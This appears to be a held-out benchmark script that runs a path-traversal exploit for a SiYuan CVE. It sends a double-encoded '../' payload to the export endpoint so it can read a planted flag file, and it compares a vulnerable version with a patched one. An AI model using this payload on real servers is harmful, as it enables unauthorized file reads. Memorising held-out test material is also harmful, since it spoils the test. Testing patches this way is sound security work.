#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-41894 residual exploit for siyuan-cve-2026-41894.

Same double-encoded traversal but targeting workspace/temp/pcb_flag.txt (the
flag file the entrypoint plants next to the export directory). On v1 (3.5.10)
IsSensitivePath only blocks conf/ and OS-level paths, so temp files are still
readable. On v2 (3.6.5) serveExport gains gulu.File.IsSubPath(exportBaseDir,
fullPath) which refuses any path outside the export directory.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import sy_util as u  # noqa: E402

PAYLOAD = "%252e%252e/pcb_flag.txt"


def candidate(*, version="v1", flag=None):
    status, body = u.get_export(version, PAYLOAD)
    return {"ok": flag in body if flag else body.strip() != "", "status": status, "body": body.strip()[:100]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
